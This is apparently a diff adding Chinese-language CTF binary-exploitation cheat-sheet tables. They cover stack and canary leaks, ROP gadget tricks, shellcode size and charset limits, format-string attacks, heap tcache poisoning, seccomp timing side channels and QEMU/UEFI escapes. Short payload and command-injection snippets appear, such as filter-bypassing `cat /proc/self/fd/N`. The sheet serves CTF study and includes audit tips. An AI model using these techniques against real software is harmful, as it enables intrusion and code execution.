+| **步长可控遍历泄漏** | 遍历函数步长（rate）用户可控 + null 终止符停止 → rate>bufsize 时索引跳过 `\0` 继续读相邻栈数据。rate=目标偏移即逐字节读 canary(1-7 字节)/ret addr(低 6 字节)——破 canary+PIE，比 null byte 覆写泄漏少一次写破坏 |
+| **逐 NUL 推进泄漏（溢出写接 %s 读）** | 越界写原语一次写 1 字节且写入字符可分"归一化类/普通类"时: 归一化类字符（非字母数字）触发 counter--/重写逻辑但 `buffer[strlen(buffer)]` 仍逐字节填充——连发可依次吃掉 canary 与 saved rbp 中的 `\0` 分隔字节（canary 首字节恒 0x00、指针高字节 0x00），尾部接字母数字字符则跳过归一化、保留刚填的值。构造: N 个填充字符 + `A`（填 canary 的 0x00）+ `BC`（填 rbp 高位 0x00）+ 终止符 → `%s` 输出连续穿过 canary/stack/PIE/libc 指针。配套: 定长恰好=N 的另一次输入其 NUL 终止符落回 canary 首字节，恢复 0x00 后续仍过校验。libc 指针高位 0x00 只能作为边界——泄漏读到此为止（读到 NUL 前 6 字节） |
+| **索引边界检查缺陷** | ① 只查索引未乘步长: `if(v2<=0xFC) read(0,&array[12*v2],0xC)` —— 12*v2 最大 0xBC4 越界; 有效上界=max_byte_offset/stride。② 有符号比较: `if(v5<=31) table[v5]=x`（v5 int）实际允许 [INT_MIN,31]，负索引写前向 GOT（先负索引读 leak 再覆写 system）; **取模索引负数未拒绝**: `number % 5`（signed）为负直接作下标——数组前方若是相邻栈指针/结构字段，负索引即别名该指针，`delete(arr[-2])` 变任意 free（指向处可伪造 chunk 即 House of Spirit，见 pwn-heap §3a 栈上变体）; 配套: `scanf("%d")` 直接收负数、menu 选项直接填负索引即触发。静态查 `-Wsign-conversion`。同族: **先除后乘截断**（`4*(ticks/1000)` 在 1500 时=4 而非 6——off-by-N 随输入增大）; **索引起点差一**（index 0 写 entries[-1] 可重叠 struct 的 size 字段——改大 size 使 print_all 超 dump 泄漏 canary/ret）; **计数器与写位置状态分离**——校验计数器（如 key 长度 counter）与实际写位置（`buffer[strlen(buffer)]`）来自不同状态源，归一化分支（非法字符替换 `buffer[strlen-1]='_'` 且 counter--）使 counter 不增但字节仍逐个填充 → 无界越界写; 字母数字字符跳过归一化分支即可保留指针终止字节不被覆盖（构造泄漏的关键开关）。静态查: 循环内 counter 增减与 strlen/buffer 写入是否同源 |
+| **协议长度字段 overread** | 回显字节数取自客户端 length 字段 → length>实际数据即泄漏相邻栈/堆（类 Heartbleed）。泄漏中按 8 字节对齐搜 `0x7f0000000000~0x7fffffffffff` 定位 libc/栈指针。审计: 长度须 min(length, actual_received) |
+| **commit-reveal 只查不消费（管道可变性）** | 服务端用 `ioctl(fd, FIONREAD, &n)` 等字节数到达就生成/披露随机值（r2），之后才 `read` 消费承诺——承诺在披露时仍在管道里未复制，加密绑定尚不成立。Linux 客户端可 `vmsplice` 一个 `MAP_SHARED` 可写页进管道: 管道缓冲区直接引用用户页，收到 r2 后改源页 = 改服务端稍后将读到的承诺字节 → 伪造 `SHA256(reveal)==commit` 同时锁定 XOR 结果。审计: 披露随机值前必须先 `read` 恰好承诺长度进不可变副本; FIONREAD 只保证字节数不保证内容已固定。vmsplice 是**把用户页直接引用进管道**的 syscall（splice 只在 fd 间搬移、sendfile 引用的是 page-cache 页——须底层文件被 MAP_SHARED 映射改写才同类，非同一向量），出现 vmsplice(fd, 用户页) 的服务即适用本条 |
+| **解析器溢出到 epilogue 就崩** | memcpy 在长度校验前执行的解析器溢出，epilogue pop callee-saved 寄存器先于 ret——恢复清单: ①读 prologue 确认 push 顺序（epilogue 逆序恢复）②rbx→可读内存（BSS/GOT）③循环计数寄存器（r12/r13）→ 退出条件值（如 1）④win 前加 ret 对齐。payload 须包合法文件格式容器（有效头+记录头） |
+| **MAC/token 恒真绕过** | 比较长度来自客户端: `strncmp(expected,supplied,n)`，n=0 恒返回 0——任意令牌通过。memcmp/bcmp 同理。防御: 拒绝 n<=0 或 CRYPTO_memcmp 定长比较 |
+| **单字节覆写确定性场景** | 无概率损失的 partial overwrite 两式: ① 返回地址 LSB 改指向**同函数内**另一次 read() 之前——read 重触发且参数栈上可控，完全绕 ASLR（"重调用原语"）; ② 栈上函数指针目标函数与原函数**同 4KiB 页**——低 12 位链接期固定，0xBC→0xA9 单字节换函数无需泄漏 |
+| **过滤只清当次 read 范围（逆序短写装 NUL）** | 输入过滤若只扫**本次 read 返回的 buf[0:n]**（遇 NUL 从 i 起 `memset(buf+i, 0, n-i)`）而不清缓冲区历史后缀——逆序分批短写可绕: ① 先发满长无 NUL 字节铺满缓冲区（保护后缀）② 对目标 payload 中每个 NUL 偏移**从大到小**逐个安装: 偏移 i 处只发 `payload[:i+1]`，未安装的低偏移 NUL 暂以任意字节占位 ③ 每次 read 返回 i+1，过滤范围止于 i，i 之后已建内容不受影响 ④（前提: 程序读满固定期望长度即结束本轮处理、退出判断先于本轮过滤执行——否则末批 payload 内最小偏移的 NUL 会被过滤截断其后内容）最后一批发完整 payload 触发返回。64 位 ROP 地址的高位 0x00 字节即靠此法逐个落位。审计: 过滤/清零的作用域必须覆盖缓冲区全生命周期（按请求长度而非本次返回值），且 read 长度取决于 `strlen(buf)` 等可变状态时要联动复核 |
+| **写循环跳不过 canary** | scanf 格式不匹配跳过原语: 输入 `-`（匹配 %d 前缀但转换失败）→ **不写目标也不消费输入**，后续迭代同样空转——固定次数写循环中让 canary/RBP 槽位迭代空转直达 ret。配套: signed 检查 `(char)count>20` + unsigned 迭代 `for(uint8_t i=0;i<count;++i)` 发 128 得 128 次越界写 |
+| **ROP 写的数据含坏字符** | 法1 **XOR 原地解码**: `pop r14;r15`+`mov [r15],r14`+`xor [r15],r14` 三 gadget——编码值写入 .data 再逐块 xor 解回（key=2/0x41 常够）。法2 **sprintf 单字节拷贝**: sprintf(dst,src) 从 src 拷到 null——src 指向二进制内"目标字节+\x00"地址即单字节复制，逐字节拼到 BSS（源地址本身也须无坏字符; 需 pop3ret 清栈）|
+| **无 mov [reg],reg 写 gadget** | **异种指令链**（出题人常埋 questionableGadgets 段）: 64 位 BEXTR+XLAT+STOSB——`bextr rbx,rcx,rdx`(rdx=0x4000,rcx=addr-补偿add) 载地址 → `xlat [rbx]` 取字节到 al → `stosb [rdi]` 写入且 rdi++。32 位 PEXT+BSWAP+XCHG——贪心求 mask 使 PEXT(0xb0bababa,mask)=目标字节 |
+| **rdx 被 libc 调用砸掉** | puts 等调用后 rdx 变小值，后续 read(fd,buf,rdx) 失效。三路: ① libc 内找 `pop rdx;pop rbx;ret`（2.35 约+0x904a9，rbx 填垃圾）② 重入二进制 read setup: `pop rbp` 设 rbp=TARGET+0x40 后跳 `lea rax,[rbp-0x40];mov edx,0x100;...;call read` → read(0,TARGET,0x100)，⚠其后 leave;ret 天然栈迁移到 rbp（下段 ROP 写进 read 的数据 rbp+8 处）③ raw syscall 链绕过 libc prologue（CET/栈问题免疫）|
+| **无 pop rax 设不了系统调用号** | **read 返回值即 rax**: 总输入长度精确=目标 syscall 号（如 0x142=stub_execveat），read 返回后 rax 恰好就绪，配 `xor rdx,rdx;syscall`/裸 syscall gadget。execveat 用 AT_FDCWD 参数同 execve。通用: 任何返回值可控函数（read/write 长度、atoi）都是 rax 设置器; 对照 替代表找号码可达的功能等价调用 |
+| **要 rdx=0 但无 pop rdx** | **canary 校验 epilogue 当 gadget**: `mov rdx,[rsp+8]; xor rdx,fs:0x28`——canary 完好时结果恒 0。跳入该序列获 rdx=0（副作用仅无害比较跳转），每个开 canary 的函数都有（搜 `xor rdx, qword ptr fs:`）。三参数完整控制仍优先 ret2csu |
+| **shellcode 须全字母数字** | 字母数字编码器（自解码 stub）要求入口 `rax+padding_len==shellcode 地址`; harness 进 rax=0 时前置 3B 种子 `push r12;pop rax`（0x41 0x54 0x58="ATX" 恰全字母数字）——r12 Linux 上常驻 _start 地址; 编码器 padding_len=3 补偿 |
+| **shellcode 空间十几字节** | ① 入口寄存器审计前置: qemu-gdb 断点 `info registers`，调用方残留 eax=syscall 号/ebx=fd 直接复用只补缺参（32 位 write 场景 7B 够）② 压缩: `cdq`(1B) 清 edx / `push+pop`(2B) 代 mov(3B) / `push imm8;pop rax` 设小号 ③ 加密通道按块放行时 CBC 构造 `IV=AES_decrypt(已知密文块)^目标明文` 让首块解密出任意 shellcode。stager 模式见上表「syscall RCX 副作用」行。**4 字节×多轮执行版**: callee-saved r12-r15 跨迭代持久当状态存储——`add r12,[rsp]` 累积泄漏（4096 循环放大时序）/ `mov [r15],r12b` 逐字节构造 / `push rsp;pop rdi;push r15` 恰 4B 迁移 |
+| **payload 须全合法 UTF-8** | 优先 **SROP**（仅 3 个 gadget 须过校验）。sigframe 寄存器字段 8B 连续——违规连续字节（0x80-0xBF）做 3 字节序列中段，**leader 字节(0xE0-0xF7)放前一寄存器字段末字节**让序列跨字段边界合法化（r15 末 0xE0 + rdi 头 B0 9F = U+0C1F）。任何结构化数据过 UTF-8 校验同理 |
+| **seccomp 只留 open/read 禁全部输出** | **时间盲外带**: shellcode 逐字节 cmp 猜测值，匹配则烧 CPU 循环（inc ecx 到 0xffffffff 约 4s）再 exit——响应时间差即 oracle，~95×flag_len 次连接。无输出函数的裸机/嵌入式同样适用。**9 字节极小版**: `test BYTE PTR [rip+2],imm8`(7B)+`je 0`(2B)——位与立即数无交集→死循环挂起，有交集→崩溃; 立即数按 1/2/4/8 探测，每连接 1 bit（挂起 vs 崩溃时间差），比烧循环更省字节 |
+| **pwntools asm() 前向标签失败/PIC shellcode 构造** | 手工三件: `jmp short body`(2B) + body 首条 `pop rbx`（call 返回地址=紧邻数据地址）+ 尾部 `call rel32`（E8+补码偏移）回 body 头——数据地址经 call/pop 获取，`and rbx,-4096` 可页对齐推基址。JIT 错位场景: 4B shellcode 块间 2B `jmp` 串联; 2 字节指令库 `push rdx;pop rsi`/`xor eax,eax`/`not dl` |
+| **Windows 无格式串需栈泄漏** | `ntdll!RtlCaptureContext(&ctx)` 把含 **Rsp/Rip** 的完整寄存器组写入用户 CONTEXT 结构——确定性无随机化; 控制一次间接调用指向它+事后读缓冲即泄漏。同类: RtlUnwindEx 等"寄存器导出到用户内存"的异常处理 API 都是泄漏 gadget |
+| **无泄漏但 32 位 PIE** | 多数发行版 i386 PIE 固定加载 `0x56555000`——qemu-gdb `info proc mappings` 多次运行验证一致后当常量: `target=0x56555000+符号偏移` 零泄漏。`ulimit -s unlimited` 下栈基址也确定化（0x7fff_f000）。动手泄漏前先验证映射稳定性 |
+| **只能输入浮点数 double** | IEEE754 指数固定 bias+52（字节序 \x30\x43 开头）→ 加法退化为整数加无舍入——每个 double 是 6 字节无损容器; "写 N 个 double"=写 N×6 字节原始数据。程序对输入求和后执行的，选末项=系数×目标-Σ前项补齐。float 同理（bias+23，3 字节/个） |
+| **Go 二进制目标** | 参数**压栈**不走 SysV 寄存器——pop rdi 链无效，gadget 搜 `mov [rsp+` 类; runtime 固有函数可链: morestack_noctxt/gopanic/memmove; Go 内嵌 "sh"/"cat /flag" 字符串免 libc 搜; **CGO 时**（ldd 见 libc）标准寄存器 ROP 恢复。IDA 9.0+ Golang FLIRT 恢复符号（1.10-1.23）。**slice 值拷贝别名**: struct 拷贝共享 backing array，cap>len 时被调方 append 原地写穿透调用方——"值传递≠不可变"; map 恒引用共享 |
+| **ASAN 编译的目标** | shadow: 0x00 全通过/0x01-07 部分/F1 F3 红区/F5 返回后。**fake stack 50% 概率**——真假栈 redzone 外布局不同: 泄漏返回地址比对已知偏移判定，假栈断开重连。红区间 16B 槽位制算合法 OOB 路径; shadow 本身可改写（改 0x00 解锁越界） |
+| **hash 摘要拼接当代码执行** | 爆破 preimage: 摘要首 2 字节 `eb 0c`(jmp+12) 跳到末 2 字节当指令——每 digest 一条 2 字节指令（31c0/89e1/b220/cd80）; 3-hash 链 EB02+push win+C3; 32 位前缀 8 核 60s、16 位瞬时; 预计算前缀→输入查找表应对运行时地址 |
+| **"趣味编码"补丁/校验系统** | Game Genie/许可证格式类 = 字母表+位散布的位置换密码——逆向 checker 得位映射后即任意 (offset,byte) 写原语: 补丁 call memset→system + push 参数落点指向可控 "sh;" 串 |
+| **字节码验证器白名单** | 静态检查只验初始指令流→**运行时自修改**: `push fs`(0f a0 合法) vs `syscall`(0f 05 禁用) 一字节差——前置 `push rbx` 让 0x05 落在 a0 字节上翻转语义。找一字节差指令对+验证器是否只验拷贝前字节（TOCTOU 指令流版） |
+| **io_uring 程序有 UAF** | **SQE 注入**（≠ kworker 路线）: SQE 在用户态共享内存、内核原样信任——UAF/类型混淆写 SQE 缓冲（opcode=IORING_OP_OPENAT/fd=AT_FDCWD/addr=路径）后 worker 提交即内核开文件。审计: io_uring_setup/enter+自定义分配器 FLUSH+多线程共享内存 |
+| **ORW 本地通远程挂** | Docker/socat 继承 fd 使 open 返回 fd≥4，硬编码 fd=3 读错——`xchg rdi,rax;cld;ret`（libc 常有）动态转 open 返回值; `pop rdx;xor eax,eax;ret` 双用途一次设 read 长度+清系统调用号 |
+| **零泄漏但有 fgets+BSS+ROP** | **multi-fgets 拼 fake stdout**: 指针 6 字节有效+2 高位 null——fgets(addr,7) 追加的 null 恰落指针第 8 字节零破坏; 逐 7 字节拼 _flags/write_base=&GOT/write_end → fflush(fake) 输出 GOT 泄漏 libc。把"泄漏"延后到 fake FILE 自身 |
+| **有符号 2D 索引 y*width+x** | int32 乘法回绕负值过有符号上界检查→**负向** OOB 写数据缓冲前元数据（改前邻 struct 的 size/height 字段扩界→泄漏→全量 OOB→environ→ROP）。Web API 包二进制时: XSS（\|safe）fetch admin API 桥接 + sendline 换行注入 `color="#0\nEXIT\n./read_flag"` 堆叠命令 |
+| **栈变量共享栈槽/进位破坏** | word@rsp+0x48 与 byte@rsp+0x49 重叠（word 高字节==byte 变量）——对 word +255 进位溢入改 byte 变量（index 3→4）OOB 直达 RIP。反汇编查同偏移不同操作数大小的访问。同族: 校验晚于计算使用（AI 均值 (human+last)/2——提交 2× 偏移）/signed 坐标 vs unsigned 维度比较（负值转大无符号过 <）/手写 to_int32 符号扩展（0x80000000+i 逐字节泄漏） |
+| **1 字节溢出改 size 字段** | 8-bit 读循环计数器在缓冲大小处回绕多写 1 字节——**渐进式泄漏**: 每轮 size+一点（0x40→0x48 泄漏 canary/rbp→0x77 泄漏 libc ret）→ 终轮恢复 canary+fake rbp（one_gadget 栈约束槽 [rbp-0x78]/[rbp-0x60] 用 \x00 精确对齐）+one_gadget。"每轮多看一点"比一次性利用稳 |
+| **只有读原语** | ① memcpy(stack_buf,addr,len) 长度可控即写: GOT 泄漏 libc→`__environ`（libc 全局恒指栈环境数组）→返回地址定位→输入缓冲预埋 ROP→memcpy 溢出盖 ret→EOF 触发 ② 纯 read(0,stack,N): 从"恰好含所需字节"的 libc 偏移读上栈——本地扫 .text/.rodata 找 gadget 地址值出处当数据源。__environ→栈是 libc 已知后无栈泄漏的标准桥 |
+| **JIT 引擎分支偏移窄类型** | jz rel32 但偏移计算 cast uint16——代码>64KB 跳进 add 立即数中间→**JIT spray**: 永假 if 内 ~9370 条用户控立即数 add，2 字节指令片段+`EB 03`(jmp $+3) 穿针跳过样板字节→mmap RWX→mov [rax],imm8 逐字节写全 shellcode |
+| **DNS/解压类解析器定长输出缓冲** | 压缩指针（0xC0\|offset）链式**重访**同一数据——解压放大溢出 1024B 栈缓冲; ROP 按 DNS label 63B 限制拆多 question 条目（14+14+13 gadget）; flag 路径第二 UDP 包喂 ROP 的 read。任何"指针引用展开"解压都需放大上限 |
+| **ELF 签名校验** | 只哈希 section headers+SHF_ALLOC 内容 → **program header 不在覆盖内**（加载器用 phdr 映射、section 运行时可选）: 页对齐追加 shellcode+改 PT_LOAD 的 offset/filesz/vaddr 指向它——签名仍过、加载执行 shellcode。安全设计须盖全文件 |
+| **服务读秘密后可执行命令** | open/memfd_create 无 O_CLOEXEC/MFD_CLOEXEC → system 子进程继承 secret fd → `cat /proc/self/fd/N`; strstr 黑名单用单引号拆词 `p'r'oc`（bash 透明拼接、C 子串匹配破坏）绕; 同族 `\p\r\o\c` 反斜杠/`${PATH:0:1}` 展开 |
+| **校验和/哈希 oracle** | CRC-8/XOR/加法和对单字节**双射**——对可控地址算校验时预计算 256 反查表逐字节读任意内存（GOT→libc→environ→canary→ROP） |
+| **Unicode/表示转换后拷贝** | UTF-8 大小写转换字节膨胀（U+0587 2B→4B; g_utf8_strup/u_strToUpper）——68 个膨胀字符 136B 输入 272B 输出溢出按输入定长的缓冲。与进制转换膨胀同查"transform 后按 input 尺寸分配"模式 |
+| **单 bit 翻转原语** | 累积=缓慢任意改写。优先目标: ①栈展开指令（`add rsp,0x48`→`0x08` 错位复用缓冲）②既有分支改语义（`jmp rax`(FFE0)→`jmp rsp`(FFE4); canary `jnz`(75)→`xor eax,imm32`(35)）③mprotect 参数（mov r15,rbp→rsp）④长度参数扩读。或 shellcode 与 .text 逐位比对翻差异 |
+| **mmap/munmap 尺寸来源不同** | 分配按维度、释放按压缩长 → **over-unmap 摧毁邻区**: 释放缺口被 pthread 线程栈复用→悬垂缓冲指针变写线程栈→ROP（免竞态免堆元数据）。配套形态: 全局索引先写后验（last_memo 残留越界值+edit 无检查=栈写）/strdup 菜单 UAF（exit 确认 no 返回带悬垂，无校验字段 strdup 复用有校验字段槽注入 system） |
+| **strcspn 截断惯用法** | `buf[strcspn(buf,"\r\n")]=0` 在换行处写 null——输入层拦 null 放行 %0A 时: `../flag.txt%0A` → null 截掉 `.cfg` 后缀+路径遍历。层间编码语义缝隙（CGI 层 vs C 层）即注入点 |
+| **分发表/权限表索引寻址** | `mov rax,[base+idx*8+C]; call rax` 且检查只判表项 null 不验 idx 界——负/大索引把全二进制对齐 qword 当函数指针。选指向 `add rsp,0x58;ret` 类 pivot 的索引，消息 payload 恰在 rsp+0x58=完整 ROP。零溢出纯逻辑缺陷 |
+| **NN/模型输出当索引** | 推理结果直接做数组索引/偏移且无界——改权重/bias 文件使输出越界; bias 数组（IEEE754 double）恰在落点时目标地址按位模式写进 bias=函数指针。ML 参数编辑即控制流劫持 |
+| **shellcode 唯一字节/字符类限制** | 校验状态（seen[256] 计数器）在栈上时——第一段 shellcode push 喷栈覆写计数器+跳回 main 跳过 memset，第二轮污染状态算术溢出显示 <N，任意 shellcode 通过。重入跳过初始化使污染跨轮存活 |
+| **迭代/演化后执行的 payload** | 找变换的**不动点**当载体——Game of Life 用 still-life（Block/Snake 构型）包夹 shellcode 行保 15 代稳定; 指令避免 5+ 连续 1 bit、`add al,0` 当 NOP、行间 JMP。简化: 稳态轻代码先 read 真 shellcode 上网格 |
+| **XOR 密码污染堆元数据** | 每 seed 产生确定 XOR 向量——建 64 维 GF(2) 线性基（高斯消元）求 seed 子集 XOR 恰等于 delta=C^T（safe-linking 编码目标）——万级 seed 解 ~30-35 个，全局联合求解优于逐字节爆破。数学同 GF(2) 线性基消元 |
+| **QEMU 设备/TEE/UEFI 特殊环境** | QEMU: PMIO 设 seek+MMIO OOB 写状态结构内函数指针（blocks→rand_r=system、r_seed="/bin/sh"）宿主逃逸——审计 mmio_write/pmio_write 的"基址+可控偏移"计算。OP-TEE: 通信层注入（HTTPd 替换空格但 RPC 认 \t）+TOCTOU+BGET 堆 UAF 跨信任边界; aarch64 almighty gadget。UEFI edk2: 改 chunk 的 EFI_MEMORY_TYPE 跨 freelist 类型混淆→UAF+FD/BK 任意写→启动项加 rdinit=/bin/sh |
+| **libc 版本完全未知+有 GOT 泄漏+任意读** | **JIT-ROP 扫 syscall 字节**: read/write 等是 syscall 薄封装函数体内必含 `0f 05`——泄漏 read@GOT 后读函数体 0x100B，index(b'\x0f\x05') 得 syscall gadget，覆写未用 GOT（如 srand）; read(0,bss,59) 返回值恰好设 rax=59=__NR_execve → 调被覆写 PLT 即 execve。比 DynELF 交互更少 |
+| **checksec 显示 No PIE 且 statically linked** | 静态链接把全部 libc 符号+字符串表拖进二进制固定地址——`nm binary \| grep ' T system'` + `strings -a binary \| grep /bin/sh` 确认后，溢出槽再小也够放 `system; exit; &/bin/sh` 三地址单链（12B），无需泄漏/gadget 搜寻 |
+| **free() 先于引用计数/判空执行的共享 slot**（KV/对象存储） | 释放处理器无条件 `free(ptr)`、之后才 `if (ref-- == 1) 清 slot`——配合浅拷贝共享（COPY 只 ref++ 复用指针）: DELETE 一次后所有共享 slot 均悬垂（ptr/len 原样保留）→ 悬垂 GET=读 freed chunk、悬垂 EDIT=写 freed chunk，且未清零的 slot 可再次 DELETE。审计信号: 任何"先 free 后查计数"的释放路径 + 指针共享原语并存 |
+| **tcache poisoning 差一次 count** | malloc 走 tcache 要求 `counts>0`——链里 N 块只支撑 N 次 malloc，poison 改链尾 next 后第 N+1 次 malloc 才返回目标但 count 已尽走正常路径。补法: 悬垂写清 freed chunk 的 key 字段（offset 8）后再 free 同一块——key≠tcache 跳过 double-free 遍历检查，合法二次入链（count+1）; 需要几段补几次（每对共享 slot 提供一次 EDIT 清 key + 一次 DELETE）。注意 glibc≥2.34 tcache key 是随机值（非 tcache 结构地址），不能当堆泄漏用——堆页号从单块链的 next 取: `next=(p>>12)^0=p>>12`，无需低 12 位 |
+| **命令处理器调 .bss 函数指针 / 回显全局区** | 菜单协议中"EXEC/回调"类命令调用全局函数指针且参数用户可控=天然 RCE 落点（改指针为 system 即 system(用户数据)）; "DUMP/状态"类命令回显 .bss/.data 起始区=免费泄漏原语（首 qword 常是初始化写入的函数指针→直接破 PIE）。逆完 dispatch 后优先标出这两类命令再设计链 |
+| **劫持后 system("sh") 卡住无回显** | system 阻塞主循环等 shell 退出——被劫持命令的正常响应永远不发，勿等 recv 判成败。exploit 发触发命令后直接往连接写 shell 命令（sh 继承 fd 0/1）; 判据: 发送后连接保持活跃且无程序层响应=shell 已起 |
+
+### 格式串进阶速查
+
+| 场景 | 方法 |
+|------|------|
+| 指针参数改写后经它写（无位置参数） | **非位置参数重定向**: ⚠ 位置参数 `%N$hn` 被 glibc **预解析缓存**——中途改栈槽不生效，必须用非位置链: `%c`×N 推进到指针槽 → 非位置 `%n` 改指针指向 exit@GOT → `%<delta>c%hn` 经改后指针写（delta=(W-C%65536)mod65536）。无法内嵌地址时用; 代价百万级输出 |
+| GOT 地址含坏字节写不进 | **.rela.plt/.dynsym 补丁**: No RELRO 下改 .rela.plt 目标项 r_info 符号索引字节→指向另一符号，再 %hn×2 改该符号 st_value=win——链接器跟补丁链跳转，全程不碰 GOT。与 ret2dlresolve 伪造全套法互补，本法 2-3 次写 |
+| 格式串缓冲在 .bss（非栈） | **saved EBP 覆写迁移**: %n 写 saved EBP = bss_buf-4 → 函数返回 leave;ret 使 ESP 落 bss、ret 从 bss_buf 取 EIP——链首地址放缓冲开头。与堆缓冲指针链两段写并称"格式串不在栈上"两路 |
+| 需要泄漏但只有崩溃消息 | **argv[0] 覆写 + SSP leak**: 溢出故意破坏 canary 后继续覆盖 argv[0]=秘密地址 → `__stack_chk_fail` 打印 `*** stack smashing detected ***: <argv[0]>` 即泄漏内容。反向用法: `__stack_chk_fail@GOT`→main 后破坏 canary 变受控重入 |
+| 漏洞后紧跟 exit(0) 一次机会 | **单次 printf 读写同发**: 同 payload 先 `%25$p` 泄漏再 `%{delta}c%19$hn` 把 exit@GOT 低 16 位改 main（delta 扣除已输出计数）→ exit 被劫回 main 二次利用 |
+| Objective-C NSLog(user_input) | **%@ specifier**: %@ 把栈参数当对象指针调 objc_msg_lookup(rdi,"description")——伪造 [isa=0][rax=system] 对象触发检查失败路径的 `call rax`。格式串升级为 controlled call |
+| 溢出可达 libc 全局但无格式串漏洞 | **printf_function_table 覆写**: 表非 NULL 时 specifier 经 arginfo_table 分发——覆写 __libc_argv 指向 flag + 伪造表项指 _fortify_fail + 置两个表指针 → 任意 printf 触发泄漏。偏移随 glibc 版本变（version-sensitive）|
+| 溢出差一点到返回地址 | **scanf 栈上格式串覆写**: 格式串是栈局部（`lea rdx,[rbp-...]` 栈寻址）而非 .rodata（rip 相对）时——第一次溢出把 "%30s" 改 "%99s"，第二次用扩大读长达 ret。guard 本身可覆写比限制值更关键 |
+| 输入经变换（ROT13/XOR/Base64）后进 printf | **预编码穿透**: payload 用同一变换预编码（自逆变换直接抵消; 通用按逆序抵消构造）。ROT13 只动字母——p64 地址字节原样过，仅格式串文本需编码。**变长编码（base85）参数偏移不稳**: 解码产物占栈 P 随 payload 变——收敛循环迭代 `arg_base=6+P/8` 至自洽+补齐编码组边界; 编码致 libc 地址难算时避开 libc: RWX 固定地址写 shellcode+%hn 改 .fini_array |
+| 自定义 printf specifier（register_printf_specifier） | **arginfo 回调覆写**: 注册表在堆——溢出改 arginfo_fn=system 后 `%.26739s` 的 precision(=0x6873="sh\0") 作 printf_info 首字段即 system 参数。与全局 printf_function_table 覆写同族 |
+| 过滤删 % 字符 | `%%%p`——过滤器检查 % 后相邻字符时，%% 转义吃掉前两个，第三个 % 存活生效 |
+| 游戏/状态机程序（不 RCE 只需改状态） | 栈上常有指向游戏变量（筹码/血量/分数）的指针——%Xc%N$n 直接写值触发 win 条件; 相邻变量（4B 间隔）用 N/N+1 两槽分别写 0 和大值 |
+| **栈内容有数论约束**（须素数/平方等） | **运行时合成**: 目标值拆合法部分之和/XOR（Goldbach: 偶数=两素数和，奇数先试 2+g-2）写入相邻槽，前置 `pop rax;pop rdx;add rax,rdx;push rax;ret` 类 reducer gadget 在 ret 消费前合成。平方约束用拉格朗日四平方同理。先找程序内现成算术 gadget 再定分解形式 |
+| **gadget 带中间杂指令** | 别弃用——逐行审查: 只要杂指令不破坏目的寄存器（`add al`/`and al` 不碰 esp 无害），多余栈消耗（`add esp,0x24`）用垃圾槽 padding 吸收、被 pop 的寄存器填垃圾值。与立即数藏 gadget、异种指令链并称 gadget 枯竭三路 |
+| **Ruby 服务用户输入内插 unpack/pack 格式串** | 格式串注入 Ruby 变体（CVE-2018-8778，<2.5.1）: 巨大 `@N` 偏移带符号比较回绕为负→读字符串缓冲区之前的内存逐字节输出; payload `@2^64-0x1C0000 C1200000` 即任意内存 dump。相关: Ruby String#unpack 格式串注入（CVE-2018-8778）详见 pwn-methodology 格式串进阶表 |
+| **远程无 libc 文件**（附件只有二进制，版本未知） | **内存 ELF 解析链**: GOT 泄一个 libc 指针 → 从该指针**页对齐向下回扫**找 `\x7fELF` 头 → 解析 program headers → PT_DYNAMIC → DT_GNU_HASH → 沿 hash bucket 链解符号（`system`/`__environ`）——全程只用任意读原语，无需本地匹配 libc。配套: `__environ`（libc 全局恒指栈环境数组）→ 读栈 → 找 main 帧的不变量匹配（如 `[p+8]` 是自引用指针、相邻菜单选择值、返回地址落在 libc 区间三条件）定位 saved rip |
+| **PIE 零泄漏入口**（无输出函数可用） | **`__dso_handle` 自引用重定位**: PIE 基址 + 固定偏移处（.data 段头部附近）有 `R_X86_64_RELATIVE` 条目，其 addend 即 `自身地址 = base + offset`——若程序有"按索引读 .data/重定位表"类的负索引/越界访问，`view(-N)` 读到的 self-pointer 减偏移即 PIE base，无需任何格式串/输出 |
+| **大堆布局不可控（跨 ~1GiB 找 OOB 落点）** | **mmap threshold 动态抬升 + pattern 必中**: 先 free 一个大 mmap 块（≥128KiB）抬高 `mp_.mmap_threshold`（glibc 动态调整，粗略翻倍）→ 后续同尺寸 malloc 走 brk/堆而非 mmap → 连续分配 N×8MiB 成一片 → 其中一块填满 `p64(target)` 模式 → 从 PIE 起**按块大小步进**扫（8MiB 对 8MiB 必中一次落点）——OOB 读/写一次命中 |
+| **浮点程序且索引/上限由运算结果决定** | **fenv 检查顺序缺陷**: `fetestexcept` 在运算**之前**调用则检查的是上一次的标志位——本次上溢（`1e308 * 1e308` 向上舍入 = inf）漏检，inf 参与后续"扩大索引上限"类逻辑（`limit = product of usable sizes`）→ 巨大索引合法通过。识别: 审计所有浮点代码的 fetestexcept/clear 与实际运算的相对顺序; 利用: 两个大 double 相乘制造 inf 绕过上限检查 |
+| **seccomp 严苛但需确认输入是否正确（验证 oracle）** | **ENOSYS vs ERRNO 差异**: 未定义 syscall 正常路径返回 `-ENOSYS`(-38)，被 seccomp `SECCOMP_RET_ERRNO(1)` 拦截返回 `-1`——同一 syscall 号两种来源可区分。用于逆向输入校验器: 程序以"syscall 返回值满足约束"当验收（如自定义 syscall 0x1337-0x1344 的 `((arg^k1)+k2)&mask == target`），把每条 BPF 约束翻成 Z3 方程 + 末尾 checksum 联立求解唯一输入。配套: **间接跳转主导 + SIMD 直线代码**的二进制——提取 Unicorn 执行的基本块路径 + 内存写 + seccomp BPF（比重建静态控制流有效）; MBA 混淆函数逐指令翻译进 Z3（每条指令一个表达式），用运行时观测的中间状态对拍验证翻译正确性 |
+| **隐藏数据页地址随机（16GiB 范围内找一页）** | **`MAP_FIXED_NOREPLACE` 占用 oracle 二分**: 白名单允许 mmap/munmap 时，对候选区间 `mmap(addr, len, PROT_READ, MAP_FIXED_NOREPLACE|MAP_ANON|MAP_PRIVATE)` 返回 `-EEXIST` = 该区间已被隐藏页占用; 对半缩小 + 成功探测立即 munmap 复原——22 次探针从 16GiB 定位到 4KiB 页。**区间左闭右开** `[addr, addr+len)`——二分边界取 `hidden < addr+len` 判归属，端点相等不算覆盖。只许写固定页时，把页内容拷到可写出口逐 8 字节送出 |
